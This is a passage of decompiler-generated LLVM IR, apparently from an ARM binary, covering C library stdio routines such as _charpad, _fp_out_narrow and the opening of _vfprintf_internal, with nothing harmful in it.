dec_label_pc_133dc:                               ; preds = %entry, %dec_label_pc_13418
  store i32 ptrtoint (i8* @global_var_16b04.825 to i32), i32* %r3.global-to-local, align 4
  store i32 78824, i32* @lr, align 4
  %v1_133e4 = call i32 @__pthread_return_0()
  %v2_133e8 = icmp eq i32 %v1_133e4, 0
  %v0_133ec = load i32, i32* @r5, align 4
  store i32 %v0_133ec, i32* @r0, align 4
  br i1 %v2_133e8, label %dec_label_pc_13418, label %dec_label_pc_133f4

dec_label_pc_133f4:                               ; preds = %dec_label_pc_133dc
  %v0_133f4 = load i32, i32* @r4, align 4
  %v1_133f4 = add i32 %v0_133f4, 8
  %v2_133f4 = inttoptr i32 %v1_133f4 to i32*
  %v3_133f4 = load i32, i32* %v2_133f4, align 4
  store i32 %v3_133f4, i32* %r3.global-to-local, align 4
  %v3_133fc = inttoptr i32 %v0_133f4 to i8*
  store i8 48, i8* %v3_133fc, align 1
  %v2_13404 = load i32, i32* @r4, align 4
  %v3_13404 = add i32 %v2_13404, 1
  %v4_13404 = inttoptr i32 %v3_13404 to i8*
  store i8 0, i8* %v4_13404, align 1
  %v0_13408 = load i32, i32* %r3.global-to-local, align 4
  %v1_13408 = load i32, i32* @r4, align 4
  %v2_13408 = add i32 %v1_13408, 20
  %v3_13408 = inttoptr i32 %v2_13408 to i32*
  store i32 %v0_13408, i32* %v3_13408, align 4
  %v0_1340c = load i32, i32* %r3.global-to-local, align 4
  %v1_1340c = load i32, i32* @r4, align 4
  %v2_1340c = add i32 %v1_1340c, 24
  %v3_1340c = inttoptr i32 %v2_1340c to i32*
  store i32 %v0_1340c, i32* %v3_1340c, align 4
  %v0_13410 = load i32, i32* %r3.global-to-local, align 4
  %v1_13410 = load i32, i32* @r4, align 4
  %v2_13410 = add i32 %v1_13410, 28
  %v3_13410 = inttoptr i32 %v2_13410 to i32*
  store i32 %v0_13410, i32* %v3_13410, align 4
  %v0_13414 = load i32, i32* %r3.global-to-local, align 4
  %v1_13414 = load i32, i32* @r4, align 4
  %v2_13414 = add i32 %v1_13414, 16
  %v3_13414 = inttoptr i32 %v2_13414 to i32*
  store i32 %v0_13414, i32* %v3_13414, align 4
  br label %dec_label_pc_13418

dec_label_pc_13418:                               ; preds = %dec_label_pc_133dc, %dec_label_pc_133f4
  store i32 1, i32* %r3.global-to-local, align 4
  %v1_1341c = load i32, i32* @r4, align 4
  %v2_1341c = add i32 %v1_1341c, 52
  %v3_1341c = inttoptr i32 %v2_1341c to i32*
  store i32 1, i32* %v3_1341c, align 4
  %v0_13420 = call i32 @__stdio_init_mutex()
  store i32 %v0_13420, i32* %r0.global-to-local, align 4
  %v0_13424 = load i32, i32* @r4, align 4
  %v1_13424 = add i32 %v0_13424, 32
  %v2_13424 = inttoptr i32 %v1_13424 to i32*
  %storemerge = load i32, i32* %v2_13424, align 4
  store i32 %storemerge, i32* @r4, align 4
  %v1_13428 = add i32 %storemerge, 56
  store i32 %v1_13428, i32* @r5, align 4
  %v2_1342c = icmp eq i32 %storemerge, 0
  store i32 %v1_13428, i32* %r0.global-to-local, align 4
  br i1 %v2_1342c, label %dec_label_pc_13428.dec_label_pc_13438_crit_edge, label %dec_label_pc_133dc

dec_label_pc_13428.dec_label_pc_13438_crit_edge:  ; preds = %dec_label_pc_13418
  %storemerge12.pre = load i32, i32* bitcast (i32** @global_var_26270.851 to i32*), align 4
  br label %dec_label_pc_13438

dec_label_pc_13438:                               ; preds = %dec_label_pc_13428.dec_label_pc_13438_crit_edge, %entry
  %v11_1346013 = phi i32 [ %v1_13428, %dec_label_pc_13428.dec_label_pc_13438_crit_edge ], [ %v1_134286, %entry ]
  %storemerge12 = phi i32 [ %storemerge12.pre, %dec_label_pc_13428.dec_label_pc_13438_crit_edge ], [ 0, %entry ]
  store i32 ptrtoint (i32** @global_var_26270.851 to i32), i32* %r3.global-to-local, align 4
  store i32 %storemerge12, i32* %r4.global-to-local, align 4
  %v2_134584 = icmp eq i32 %storemerge12, 0
  br i1 %v2_134584, label %dec_label_pc_13460, label %dec_label_pc_13444

dec_label_pc_13444:                               ; preds = %dec_label_pc_13438, %dec_label_pc_13444
  %v0_1344c = phi i32 [ %storemerge1, %dec_label_pc_13444 ], [ %storemerge12, %dec_label_pc_13438 ]
  %v1_13444 = inttoptr i32 %v0_1344c to i8*
  %v2_13444 = load i8, i8* %v1_13444, align 1
  %v3_13444 = zext i8 %v2_13444 to i32
  store i32 %v3_13444, i32* %r3.global-to-local, align 4
  %v1_13448 = and i32 %v3_13444, 64
  store i32 %v0_1344c, i32* %r0.global-to-local, align 4
  store i32 78932, i32* @lr, align 4
  %v1_13450 = icmp ne i32 %v1_13448, 0
  call void @__pseudo_cond_branch(i1 %v1_13450, i32 ptrtoint (i32* @global_var_13474.862 to i32))
  %v0_13454 = load i32, i32* %r4.global-to-local, align 4
  %v1_13454 = add i32 %v0_13454, 32
  %v2_13454 = inttoptr i32 %v1_13454 to i32*
  %storemerge1 = load i32, i32* %v2_13454, align 4
  store i32 %storemerge1, i32* %r4.global-to-local, align 4
  %v2_13458 = icmp eq i32 %storemerge1, 0
  br i1 %v2_13458, label %dec_label_pc_13458.dec_label_pc_13460_crit_edge, label %dec_label_pc_13444

dec_label_pc_13458.dec_label_pc_13460_crit_edge:  ; preds = %dec_label_pc_13444
  %v11_13460.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13460

dec_label_pc_13460:                               ; preds = %dec_label_pc_13458.dec_label_pc_13460_crit_edge, %dec_label_pc_13438
  %v11_13460 = phi i32 [ %v11_13460.pre, %dec_label_pc_13458.dec_label_pc_13460_crit_edge ], [ %v11_1346013, %dec_label_pc_13438 ]
  %v2_13460 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_13460, i32* @r4, align 4
  ret i32 %v11_13460

; uselistorder directives
  uselistorder i32 %storemerge1, { 1, 2, 0 }
  uselistorder i32 %storemerge12, { 0, 2, 1 }
  uselistorder i32 ()* @__stdio_init_mutex, { 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_13444, { 1, 0 }
  uselistorder label %dec_label_pc_13418, { 1, 0 }
  uselistorder label %dec_label_pc_133dc, { 1, 0 }
}

define i32 @__stdio_wcommit() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13474 = load i32, i32* @r4, align 4
  store i32 %v3_13474, i32* %stack_var_-8, align 4
  %v0_13478 = load i32, i32* @r0, align 4
  %v1_13478 = add i32 %v0_13478, 8
  %v2_13478 = inttoptr i32 %v1_13478 to i32*
  %v3_13478 = load i32, i32* %v2_13478, align 4
  %v1_1347c = add i32 %v0_13478, 16
  %v2_1347c = inttoptr i32 %v1_1347c to i32*
  %v3_1347c = load i32, i32* %v2_1347c, align 4
  %v9_13480 = icmp eq i32 %v3_1347c, %v3_13478
  store i32 %v0_13478, i32* %r4.global-to-local, align 4
  br i1 %v9_13480, label %bb3, label %bb

bb:                                               ; preds = %entry
  store i32 %v3_13478, i32* %v2_1347c, align 4
  br label %bb3

bb3:                                              ; preds = %entry, %bb
  store i32 78996, i32* @lr, align 4
  %v1_13490 = xor i1 %v9_13480, true
  call void @__pseudo_cond_branch(i1 %v1_13490, i32 ptrtoint (i32* @global_var_171e8.863 to i32))
  %v0_13494 = load i32, i32* %r4.global-to-local, align 4
  %v1_13494 = add i32 %v0_13494, 8
  %v2_13494 = inttoptr i32 %v1_13494 to i32*
  %v3_13494 = load i32, i32* %v2_13494, align 4
  %v1_13498 = add i32 %v0_13494, 16
  %v2_13498 = inttoptr i32 %v1_13498 to i32*
  %v3_13498 = load i32, i32* %v2_13498, align 4
  %v2_1349c = sub i32 %v3_13498, %v3_13494
  %v2_134a0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_134a0, i32* @r4, align 4
  ret i32 %v2_1349c

; uselistorder directives
  uselistorder label %bb3, { 1, 0 }
}

define i32 @_charpad(i32 %arg1, i8 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-17 = alloca i8, align 1
  %v3_134a4 = load i32, i32* @r4, align 4
  %v6_134a4 = load i32, i32* @r5, align 4
  %v9_134a4 = load i32, i32* @r6, align 4
  store i32 %arg3, i32* @r5, align 4
  store i32 %arg1, i32* @r6, align 4
  store i32 %arg3, i32* @r4, align 4
  store i8 %arg2, i8* %stack_var_-17, align 1
  %v2_134c42 = icmp eq i32 %arg3, 0
  %v2_134c8 = ptrtoint i8* %stack_var_-17 to i32
  br i1 %v2_134c42, label %dec_label_pc_134e4, label %dec_label_pc_134d8

dec_label_pc_134c0:                               ; preds = %dec_label_pc_134d8
  %v1_134c0 = add i32 %v0_134c0, -1
  store i32 %v1_134c0, i32* @r4, align 4
  %v2_134c4 = icmp eq i32 %v1_134c0, 0
  %v0_134d0 = load i32, i32* @r6, align 4
  br i1 %v2_134c4, label %dec_label_pc_134e4.loopexit, label %dec_label_pc_134d8

dec_label_pc_134d8:                               ; preds = %entry, %dec_label_pc_134c0
  %v0_134d04 = phi i32 [ %v0_134d0, %dec_label_pc_134c0 ], [ %arg1, %entry ]
  %v3_134d8 = call i32 @__stdio_fwrite(i32 %v2_134c8, i32 1, i32 %v0_134d04)
  %v7_134dc = icmp eq i32 %v3_134d8, 1
  %v0_134c0 = load i32, i32* @r4, align 4
  br i1 %v7_134dc, label %dec_label_pc_134c0, label %dec_label_pc_134e4.loopexit

dec_label_pc_134e4.loopexit:                      ; preds = %dec_label_pc_134c0, %dec_label_pc_134d8
  %v0_134e4.ph = phi i32 [ %v0_134c0, %dec_label_pc_134d8 ], [ 0, %dec_label_pc_134c0 ]
  %v1_134e4.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_134e4

dec_label_pc_134e4:                               ; preds = %dec_label_pc_134e4.loopexit, %entry
  %v1_134e4 = phi i32 [ 0, %entry ], [ %v1_134e4.pre, %dec_label_pc_134e4.loopexit ]
  %v0_134e4 = phi i32 [ 0, %entry ], [ %v0_134e4.ph, %dec_label_pc_134e4.loopexit ]
  %v2_134e4 = sub i32 %v1_134e4, %v0_134e4
  store i32 %v3_134a4, i32* @r4, align 4
  store i32 %v6_134a4, i32* @r5, align 4
  store i32 %v9_134a4, i32* @r6, align 4
  ret i32 %v2_134e4

; uselistorder directives
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder label %dec_label_pc_134e4.loopexit, { 1, 0 }
  uselistorder label %dec_label_pc_134d8, { 1, 0 }
}

define i32 @_fp_out_narrow(i32 %arg1, i32 %arg2, i32 %arg3, i8* %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg4 to i32
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_134f0 = load i32, i32* @r4, align 4
  store i32 %v3_134f0, i32* %stack_var_-24, align 4
  %v9_134f0 = load i32, i32* @r6, align 4
  store i32 %arg2, i32* @r6, align 4
  %v1_134f8 = and i32 %arg2, 128
  %v2_134f8 = icmp eq i32 %v1_134f8, 0
  %v0_134fc = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_134fc, i32* @r8, align 4
  store i32 %arg3, i32* %r4.global-to-local, align 4
  store i32 %tmp, i32* @r7, align 4
  br i1 %v2_134f8, label %bb, label %dec_label_pc_13510

bb:                                               ; preds = %entry
  store i32 0, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_13550

dec_label_pc_13510:                               ; preds = %entry
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v3_13514 = call i32 @strlen(i8* %arg4)
  store i32 %v3_13514, i32* %r0.global-to-local, align 4
  %v1_13518 = load i32, i32* %r4.global-to-local, align 4
  %v2_13518 = sub i32 %v1_13518, %v3_13514
  store i32 %v2_13518, i32* @r4, align 4
  store i32 %v3_13514, i32* @r5, align 4
  %tmp16 = icmp slt i32 %v2_13518, 1
  br i1 %tmp16, label %.thread, label %dec_label_pc_13530

.thread:                                          ; preds = %dec_label_pc_13510
  store i32 %v3_13514, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_13550

dec_label_pc_13530:                               ; preds = %dec_label_pc_13510
  %v0_13530 = load i32, i32* @r6, align 4
  %v1_13530 = urem i32 %v0_13530, 128
  %v0_13534 = load i32, i32* @r8, align 4
  store i32 %v0_13534, i32* %r0.global-to-local, align 4
  %v3_1353c = trunc i32 %v1_13530 to i8
  %v4_1353c = call i32 @_charpad(i32 %v0_13534, i8 %v3_1353c, i32 %v2_13518)
  store i32 %v4_1353c, i32* %r0.global-to-local, align 4
  %v1_13540 = load i32, i32* @r4, align 4
  %v9_13540 = icmp eq i32 %v4_1353c, %v1_13540
  store i32 %v4_1353c, i32* %r6.global-to-local, align 4
  br i1 %v9_13540, label %dec_label_pc_1354c, label %dec_label_pc_1356c

dec_label_pc_1354c:                               ; preds = %dec_label_pc_13530
  %v0_1354c = load i32, i32* @r5, align 4
  store i32 %v0_1354c, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13550

dec_label_pc_13550:                               ; preds = %bb, %.thread, %dec_label_pc_1354c
  %v5_1355c = phi i32 [ %v0_1354c, %dec_label_pc_1354c ], [ %arg3, %bb ], [ %v3_13514, %.thread ]
  %tmp17 = icmp slt i32 %v5_1355c, 1
  br i1 %tmp17, label %.thread8, label %bb18

.thread8:                                         ; preds = %dec_label_pc_13550
  br label %bb19

bb18:                                             ; preds = %dec_label_pc_13550
  %v5_13558 = load i32, i32* @r7, align 4
  br label %bb19

bb19:                                             ; preds = %.thread8, %bb18
  %storemerge = phi i32 [ 0, %.thread8 ], [ %v5_13558, %bb18 ]
  %tmp20 = phi i1 [ false, %.thread8 ], [ true, %bb18 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  call void @__pseudo_cond_branch(i1 %tmp20, i32 ptrtoint (i32* @global_var_172a4.864 to i32))
  %v0_13568 = load i32, i32* %r6.global-to-local, align 4
  %v2_13568 = add i32 %storemerge, %v0_13568
  store i32 %v2_13568, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1356c

dec_label_pc_1356c:                               ; preds = %dec_label_pc_13530, %bb19
  %v0_1356c = phi i32 [ %v4_1353c, %dec_label_pc_13530 ], [ %v2_13568, %bb19 ]
  store i32 %v0_1356c, i32* %r0.global-to-local, align 4
  %v2_13570 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_13570, i32* %r4.global-to-local, align 4
  store i32 %v9_134f0, i32* %r6.global-to-local, align 4
  ret i32 %v0_1356c

; uselistorder directives
  uselistorder i32 %v0_1356c, { 1, 0 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 4, 2, 3, 5 }
  uselistorder i32* %r0.global-to-local, { 3, 0, 5, 4, 7, 6, 1, 2 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_1356c, { 1, 0 }
  uselistorder label %bb19, { 1, 0 }
  uselistorder label %dec_label_pc_13550, { 2, 1, 0 }
}

define i32 @_vfprintf_internal(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8, i32 %arg9, i32 %arg10, i32 %arg11) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %tmp, i32* @r1, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp97 = call i32 @__decompiler_undefined_function_0()
  %tmp99 = call i8 @__decompiler_undefined_function_2()
  %tmp100 = call i32 @__decompiler_undefined_function_0()
  %tmp101 = call i32 @__decompiler_undefined_function_0()
  %tmp102 = call i32 @__decompiler_undefined_function_0()
  %tmp103 = call i32 @__decompiler_undefined_function_0()
  %tmp104 = call i8 @__decompiler_undefined_function_2()
  %tmp105 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-328 = alloca i32, align 4
  %stack_var_-180 = alloca i32, align 4
  %stack_var_-53 = alloca i32, align 4
  %stack_var_-252 = alloca i32, align 4
  %stack_var_-332 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_13574 = load i32, i32* @r4, align 4
  store i32 %v3_13574, i32* %stack_var_-36, align 4
  %v6_13574 = load i32, i32* @r5, align 4
  %v15_13574 = load i32, i32* @r8, align 4
  %v18_13574 = load i32, i32* @sb, align 4
  %v21_13574 = load i32, i32* @sl, align 4
  %v24_13574 = load i32, i32* @fp, align 4
  %v2_1357c = ptrtoint i32* %stack_var_-332 to i32
  store i32 %v2_1357c, i32* @r6, align 4
  store i32 %arg1, i32* @fp, align 4
  store i32 %v2_1357c, i32* %r0.global-to-local, align 4
  %v0_13588 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_13588, i32* @r5, align 4
  store i32 %tmp, i32* @r4, align 4
  %v2_13590 = call i32 @_ppfs_init(i32* nonnull %stack_var_-332)
  store i32 %v2_13590, i32* %r0.global-to-local, align 4
  %v1_13594 = icmp slt i32 %v2_13590, 0
  br i1 %v1_13594, label %dec_label_pc_1359c, label %dec_label_pc_135d0

dec_label_pc_1359c:                               ; preds = %entry
  %v3_1359c = load i32, i32* %stack_var_-332, align 4
  store i32 %v3_1359c, i32* @r4, align 4
  %v1_135a0 = inttoptr i32 %v3_1359c to i8*
  store i32 %v3_1359c, i32* %r0.global-to-local, align 4
  %v3_135a4 = call i32 @strlen(i8* %v1_135a0)
  store i32 %v3_135a4, i32* %r0.global-to-local, align 4
  %v2_135a8 = icmp eq i32 %v3_135a4, 0
  br i1 %v2_135a8, label %bb, label %dec_label_pc_135b8

bb:                                               ; preds = %dec_label_pc_1359c
  store i32 -1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13b48

dec_label_pc_135b8:                               ; preds = %dec_label_pc_1359c
  %v0_135b8 = load i32, i32* @r4, align 4
  store i32 %v0_135b8, i32* %r0.global-to-local, align 4
  %v0_135bc = load i32, i32* @fp, align 4
  store i32 %v0_135bc, i32* %r2.global-to-local, align 4
  %v3_135c0 = call i32 @__stdio_fwrite(i32 %v0_135b8, i32 %v3_135a4, i32 %v0_135bc)
  store i32 %v3_135c0, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_13b48

dec_label_pc_135d0:                               ; preds = %entry
  store i32 %v2_1357c, i32* %r0.global-to-local, align 4
  %v0_135d4 = load i32, i32* @r5, align 4
  %v2_135d8 = call i32 @_ppfs_prepargs(i32 %v2_1357c, i32 %v0_135d4)
  store i32 %v2_135d8, i32* %r0.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  %v4_13678 = zext i8 %tmp104 to i32
  %v2_13680 = ptrtoint i32* %stack_var_-252 to i32
  %v2_136a0 = ptrtoint i32* %stack_var_-36 to i32
  %v2_136b8 = icmp eq i32 %tmp102, 0
  %v1_136cc = inttoptr i32 %tmp101 to i32*
  %v2_139bc = ptrtoint i32* %stack_var_-180 to i32
  %v2_138d8 = ptrtoint i32* %stack_var_-44 to i32
  %v2_138ec = ptrtoint i32* %stack_var_-52 to i32
  %v3_13888 = add i32 %tmp101, 4
  %v4_13888 = inttoptr i32 %v3_13888 to i32*
  %v2_1388c = ptrtoint i32* %stack_var_-328 to i32
  %v7_1374c = zext i8 %tmp99 to i32
  %v2_13788 = ptrtoint i32* %stack_var_-53 to i32
  %v5_13790 = bitcast i32* %stack_var_-53 to i8*
  %v2_13798 = icmp ugt i32 %tmp102, 4
  %v7_13798 = icmp eq i32 %tmp102, 5
  %v0_13b30.pre = load i32, i32* @r4, align 4
  %tmp132 = icmp slt i32 %tmp105, 1
  %v5_136b0187 = icmp sgt i32 %tmp103, 0
  %tmp195 = icmp ugt i32 %tmp102, 7
  %tmp196 = icmp ugt i32 %tmp102, 15
  %v2_138ac = icmp ugt i32 %tmp102, 16
  %v7_138ac = icmp eq i32 %tmp102, 17
  %v2_138b0 = xor i1 %v7_138ac, true
  %v3_138b0 = and i1 %v2_138ac, %v2_138b0
  %v2_1394c = icmp ugt i32 %tmp102, 18
  %v7_1394c = icmp eq i32 %tmp102, 19
  %v2_13950 = xor i1 %v7_1394c, true
  %v3_13950 = and i1 %v2_1394c, %v2_13950
  %v7_139b0 = icmp eq i32 %tmp102, 20
  %v2_136f0 = add i32 %tmp102, ptrtoint (i32* @global_var_1cc74.866 to i32)
  %v1_136f4 = add i32 %tmp102, add (i32 ptrtoint (i32* @global_var_1cc74.866 to i32), i32 -1)
  %v2_136f4 = inttoptr i32 %v1_136f4 to i8*
  %v2_13720 = xor i1 %v7_13798, true
  %v3_13720 = and i1 %v2_13798, %v2_13720
  %v7_13754 = icmp eq i32 %tmp102, 1
  %v2_137a0 = xor i1 %v2_13798, true
  %v3_137a0 = or i1 %v7_13798, %v2_137a0
  %tmp197 = icmp ult i32 %tmp102, 3
  %v7_13808 = icmp eq i32 %tmp102, 3
  %v11_13814 = icmp eq i32 %tmp102, 4
  %v9_13684 = mul nuw nsw i32 %v4_13678, 8
  %v10_13684 = add nsw i32 %v9_13684, -8
  %v6_1368c = add i32 %v10_13684, %v2_13680
  br label %dec_label_pc_13b30

bb126:                                            ; preds = %dec_label_pc_135e8.outer, %.thread7
  %v2_135e8185 = phi i8 [ %v2_135e8, %.thread7 ], [ %v2_135e8181, %dec_label_pc_135e8.outer ]
  %v1_135fc184 = phi i32 [ %v2_135fc, %.thread7 ], [ %v0_135e849, %dec_label_pc_135e8.outer ]
  %v8_135f0 = icmp eq i8 %v2_135e8185, 37
  br i1 %v8_135f0, label %dec_label_pc_13604, label %.thread7

.thread7:                                         ; preds = %bb126
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_135fc = add i32 %v1_135fc184, 1
  store i32 %v2_135fc, i32* @r4, align 4
  %v1_135e8 = inttoptr i32 %v2_135fc to i8*
  %v2_135e8 = load i8, i8* %v1_135e8, align 1
  %v3_135e8 = zext i8 %v2_135e8 to i32
  store i32 %v3_135e8, i32* %r3.global-to-local, align 4
  %v2_135ec = icmp eq i8 %v2_135e8, 0
  br i1 %v2_135ec, label %dec_label_pc_13604, label %bb126

dec_label_pc_13604:                               ; preds = %bb126, %.thread7, %dec_label_pc_135e8.outer
  %v1_135fc.lcssa = phi i32 [ %v0_135e849, %dec_label_pc_135e8.outer ], [ %v2_135fc, %.thread7 ], [ %v1_135fc184, %bb126 ]
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_13604 = sub i32 %v1_135fc.lcssa, %v5_13614
  %v9_13604 = icmp eq i32 %v1_135fc.lcssa, %v5_13614
  br i1 %v9_13604, label %dec_label_pc_13638, label %dec_label_pc_1360c

dec_label_pc_1360c:                               ; preds = %dec_label_pc_13604
  store i32 %v2_13604, i32* @r5, align 4
  %tmp128 = icmp slt i32 %v2_13604, 1
  br i1 %tmp128, label %bb130, label %bb129

bb129:                                            ; preds = %dec_label_pc_1360c
  store i32 %v5_13614, i32* %r0.global-to-local, align 4
  %v5_1361c = load i32, i32* @fp, align 4
  store i32 %v5_1361c, i32* %r2.global-to-local, align 4
  br label %bb130

bb130:                                            ; preds = %dec_label_pc_1360c, %bb129
  %tmp131 = phi i1 [ true, %bb129 ], [ false, %dec_label_pc_1360c ]
  call void @__pseudo_cond_branch(i1 %tmp131, i32 ptrtoint (i32* @global_var_172a4.864 to i32))
  %v0_13624 = load i32, i32* %r0.global-to-local, align 4
  %v1_13624 = load i32, i32* @r5, align 4
  %v9_13624 = icmp eq i32 %v0_13624, %v1_13624
  br i1 %v9_13624, label %dec_label_pc_1362c, label %dec_label_pc_13b40

dec_label_pc_1362c:                               ; preds = %bb130
  %v2_13630 = add i32 %v0_13624, %stack_var_-336.1.ph
  %v0_13638.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_13638

dec_label_pc_13638:                               ; preds = %dec_label_pc_13604, %dec_label_pc_1362c
  %v0_1364c = phi i32 [ %v5_13614, %dec_label_pc_13604 ], [ %v0_13638.pre, %dec_label_pc_1362c ]
  %stack_var_-336.2 = phi i32 [ %stack_var_-336.1.ph, %dec_label_pc_13604 ], [ %v2_13630, %dec_label_pc_1362c ]
  %v1_13638 = inttoptr i32 %v0_1364c to i8*
  %v2_13638 = load i8, i8* %v1_13638, align 1
  %v3_13638 = zext i8 %v2_13638 to i32
  store i32 %v3_13638, i32* %r3.global-to-local, align 4
  %v2_1363c = icmp eq i8 %v2_13638, 0
  br i1 %v2_1363c, label %dec_label_pc_13b48, label %dec_label_pc_13644

dec_label_pc_13644:                               ; preds = %dec_label_pc_13638
  %v1_13644 = add i32 %v0_1364c, 1
  %v2_13644 = inttoptr i32 %v1_13644 to i8*
  %v3_13644 = load i8, i8* %v2_13644, align 1
  %v4_13644 = zext i8 %v3_13644 to i32
  store i32 %v4_13644, i32* %r3.global-to-local, align 4
  %v7_13648 = icmp eq i8 %v3_13644, 37
  store i32 %v1_13644, i32* %r2.global-to-local, align 4
  br i1 %v7_13648, label %dec_label_pc_13b38, label %dec_label_pc_13654

dec_label_pc_13654:                               ; preds = %dec_label_pc_13644
  store i32 %v2_1357c, i32* @r4, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v2_1357c, i32* %r0.global-to-local, align 4
  store i32 %v1_13644, i32* %stack_var_-332, align 4
  store i32 0, i32* %stack_var_-44, align 4
  %v2_13668 = call i32 @_ppfs_parsespec(i32* nonnull %stack_var_-332)
  store i32 %v2_1357c, i32* @r0, align 4
  %v0_13670 = call i32 @_ppfs_setargs()
  store i32 %v0_13670, i32* %r0.global-to-local, align 4
  store i32 %v4_13678, i32* %ip.global-to-local, align 4
  store i32 %v2_13680, i32* %r3.global-to-local, align 4
  br i1 %tmp132, label %.thread, label %bb133

.thread:                                          ; preds = %dec_label_pc_13654
  store i32 %tmp103, i32* %r0.global-to-local, align 4
  br label %bb134

bb133:                                            ; preds = %dec_label_pc_13654
  store i32 %tmp103, i32* %r0.global-to-local, align 4
  store i32 %v6_1368c, i32* %r3.global-to-local, align 4
  br label %bb134

bb134:                                            ; preds = %.thread, %bb133
  %v0_1369878 = phi i32 [ %v6_1368c, %bb133 ], [ %v2_13680, %.thread ]
  store i32 %v2_136a0, i32* @lr, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  br i1 %v5_136b0187, label %dec_label_pc_13698, label %dec_label_pc_136b4

dec_label_pc_13698:                               ; preds = %bb134, %dec_label_pc_13698
  %v5_136a8189 = phi i32 [ %v5_136a8, %dec_label_pc_13698 ], [ %v2_136a0, %bb134 ]
  %v0_13698188 = phi i32 [ %v1_1369c, %dec_label_pc_13698 ], [ %v0_1369878, %bb134 ]
  %v2_13698 = add i32 %v5_136a8189, -4
  %v3_13698 = inttoptr i32 %v2_13698 to i32*
  store i32 %v0_13698188, i32* %v3_13698, align 4
  %v0_1369c = load i32, i32* %r3.global-to-local, align 4
  %v1_1369c = add i32 %v0_1369c, 8
  store i32 %v1_1369c, i32* %r3.global-to-local, align 4
  %v0_136a4.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_136a4.pre = load i32, i32* %r0.global-to-local, align 4
  store i32 %v2_136a0, i32* @lr, align 4
  %v4_136a8 = mul i32 %v0_136a4.pre, 4
  %v5_136a8 = add i32 %v4_136a8, %v2_136a0
  %v1_136ac = add i32 %v0_136a4.pre, 1
  store i32 %v1_136ac, i32* %r2.global-to-local, align 4
  %v5_136b0 = icmp slt i32 %v0_136a4.pre, %v1_136a4.pre
  br i1 %v5_136b0, label %dec_label_pc_13698, label %dec_label_pc_136b4

dec_label_pc_136b4:                               ; preds = %dec_label_pc_13698, %bb134
  store i32 %tmp102, i32* %r2.global-to-local, align 4
  br i1 %v2_136b8, label %dec_label_pc_136c0, label %dec_label_pc_136e4

dec_label_pc_136c0:                               ; preds = %dec_label_pc_136b4
  store i32 %tmp101, i32* %r3.global-to-local, align 4
  store i32 %stack_var_-336.2, i32* %ip.global-to-local, align 4
  %v2_136cc = load i32, i32* %v1_136cc, align 4
  store i32 %v2_136cc, i32* %r0.global-to-local, align 4
  %v1_136d0 = and i32 %v0_13714, 3840
  store i32 %stack_var_-336.2, i32* %r2.global-to-local, align 4
  %v3_136d8 = ashr i32 %stack_var_-336.2, 31
  store i32 %v3_136d8, i32* %r3.global-to-local, align 4
  %v4_136dc = inttoptr i32 %v2_136cc to i8*
  %v5_136dc = call i32 @_store_inttype(i8* %v4_136dc, i32 %v1_136d0, i32 %stack_var_-336.2, i32 %v3_136d8)
  store i32 %v5_136dc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13b2c

dec_label_pc_136e4:                               ; preds = %dec_label_pc_136b4
  br i1 %tmp195, label %dec_label_pc_13870, label %dec_label_pc_136ec

dec_label_pc_136ec:                               ; preds = %dec_label_pc_136e4
  store i32 %v2_136f0, i32* %r3.global-to-local, align 4
  %v3_136f4 = load i8, i8* %v2_136f4, align 1
  %v4_136f4 = zext i8 %v3_136f4 to i32
  store i32 %v4_136f4, i32* @r4, align 4
  %v7_136f8 = icmp eq i8 %v3_136f4, 10
  br i1 %v7_136f8, label %dec_label_pc_13704, label %bb135

bb135:                                            ; preds = %dec_label_pc_136ec
  store i32 87, i32* @r5, align 4
  br label %bb139

dec_label_pc_13704:                               ; preds = %dec_label_pc_136ec
  store i32 %v0_13714, i32* %r3.global-to-local, align 4
  %v1_13708 = and i32 %v0_13714, 32
